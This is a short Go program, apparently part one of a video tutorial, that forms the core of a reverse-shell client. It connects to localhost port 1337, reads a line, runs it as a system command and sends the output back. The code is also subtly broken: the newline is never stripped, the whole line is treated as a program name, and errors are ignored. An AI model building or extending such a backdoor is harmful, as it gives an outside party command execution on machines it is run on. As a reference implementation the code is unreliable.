package main

import (
	"fmt"
	"os/exec"
	"net"
	"bufio"


)

func Exec(cmd string) string {
	out, err := exec.Command(cmd).Output()
	if err != nil {
		fmt.Println(err)
	}

	return string(out[:])
}

func main() {
	conn, err := net.Dial("tcp", "localhost:1337")
	if err != nil {
		fmt.Println(err)
	}
	

	data, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		fmt.Println(err)
	}
	fmt.Printf(data)

	fmt.Fprintf(conn, Exec(data))

	

}
//the next part in the next video because thix video is very long